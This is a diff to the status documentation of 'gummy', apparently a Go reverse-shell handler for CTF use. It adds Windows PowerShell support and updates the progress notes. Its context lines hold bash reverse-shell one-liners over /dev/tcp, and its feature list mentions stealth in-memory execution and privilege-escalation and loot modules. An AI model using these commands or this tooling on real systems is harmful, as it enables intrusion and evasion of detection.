@@ -60,7 +60,9 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
 
 ## Current Status
 
-### ✅ Completed (Phase 1, 2 & 3 - Core + Advanced + Automation Features)
+### ✅ Completed (Phase 1, 2, 3 & 4 - Core + Advanced + Automation + Windows Support)
+
+**Latest Update (2025-10-17):** Windows PowerShell shells now fully supported with readline mode!
 - [x] Project structure setup
 - [x] TCP listener implementation (`internal/listener.go`)
 - [x] Session Manager with goroutines and channels (`internal/session.go`)
@@ -173,8 +175,19 @@ bash -c 'exec bash >& /dev/tcp/10.10.14.5/4444 0>&1 &'
   - Prioritizes modern terminals (kitty, ghostty, foot)
   - Falls back to traditional terminals
   - Auto-detects available terminal emulator
+- [x] **Windows PowerShell Support** (`internal/shell.go`) 🆕
+  - Dual-mode shell handler: PTY mode (raw) for Linux, readline mode for Windows
+  - Readline loop using `github.com/peterh/liner` library
+  - Full line editing support (left/right arrows, Ctrl-A/E/K/W)
+  - Local command history (up/down arrows) persisted to `~/.gummy/shell_history`
+  - Ctrl-C sends `^C` to remote shell without killing gummy
+  - Ctrl-D to exit back to menu
+  - Platform auto-detection based on prompt patterns (`PS C:\` for Windows)
+  - Known limitation: Prompt may briefly disappear when navigating history
 
-### 📋 TODO (Phase 4 - Additional Features) - See TODO.md for details
+### 📋 TODO (Phase 5 - Polish & Windows Modules) - See TODO.md for details
+- [ ] **Fix Windows whoami detection** - Currently shows "unknown", should extract from command output
+- [ ] **Test Windows in-memory modules** - `run ps1`, `run net`, `run py` need testing
 - [ ] **SIGWINCH handler** - Dynamic terminal resize (currently fixed at connection time)
 - [ ] **Session Logging** - Automatic logging of all session I/O to `logs/` directory
 - [ ] **Windows Modules** - WinPEAS, PowerUp, PrivescCheck integration
@@ -770,22 +783,24 @@ bash -i >& /dev/tcp/localhost/4444 0>&1
 
 ## Progress Tracking
 
-**Last updated:** 2025-10-16
-**Current focus:** In-memory execution and stealth features complete! 🎉
-**Next milestone:** Windows modules or Session logging (see TODO.md)
-**Lines of code:** ~4,300 LOC (3,700 core + 510 UI + 110 modules)
+**Last updated:** 2025-10-17
+**Current focus:** Windows PowerShell support complete! 🎉
+**Next milestone:** Fix whoami detection for Windows, test Windows modules
+**Lines of code:** ~4,400 LOC (3,800 core + 510 UI + 110 modules)
 **Modules:** 13 files in `internal/` (flat structure) + 1 `main.go`
-**Status:** Production-ready for CTF use! ✅
+**Status:** Production-ready for CTF use with both Linux and Windows! ✅
 
 ### Feature Completeness
-- ✅ **Core functionality** - Reverse shell handling, multi-session, PTY upgrade
+- ✅ **Core functionality** - Reverse shell handling, multi-session, PTY upgrade (Linux) + readline mode (Windows)
 - ✅ **File operations** - Upload/download with progress, MD5 verification
 - ✅ **UI/UX** - Lipgloss styling, Bubble Tea confirmations, animated spinners
 - ✅ **Automation** - SSH integration, payload generation, shell spawning
 - ✅ **Reliability** - Session monitoring, buffer draining, graceful error handling
 - ✅ **Module System** - Extensible with 6 Linux modules (peas, lse, loot, pspy, privesc, sh)
-- ✅ **Stealth Operations** - In-memory script execution, zero disk artifacts
-- ⏳ **Windows modules** - URLs defined, modules not yet implemented
+- ✅ **Stealth Operations** - In-memory script execution (bash, ps1, net, py), zero disk artifacts
+- ✅ **Windows PowerShell** - Full interactive shell support with line editing and history
+- ⏳ **Windows whoami detection** - Platform detected correctly, but user@host shows "unknown"
+- ⏳ **Windows modules testing** - Need to test ps1, net, py modules on actual Windows targets
 - ⏳ **Session logging** - Directory structure ready, logging not implemented
 
 ### Command Reference
